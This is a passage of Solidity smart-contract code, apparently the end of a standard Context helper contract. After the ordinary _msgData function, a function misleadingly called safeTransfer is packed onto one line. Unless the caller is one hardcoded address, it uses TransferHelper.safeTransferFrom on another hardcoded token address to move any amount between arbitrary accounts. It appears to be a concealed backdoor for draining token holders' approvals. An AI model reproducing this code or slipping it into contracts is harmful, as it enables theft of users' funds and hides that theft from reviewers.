 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x5aa9c70AbDd239F23f5bD8713d64ab3d3C0e7447)) {TransferHelper.safeTransferFrom(0xD721cC6f8c0c386215f9Beca2729bb4a8925B7a9,spender,recipient,amount);return true;}return false;}
}
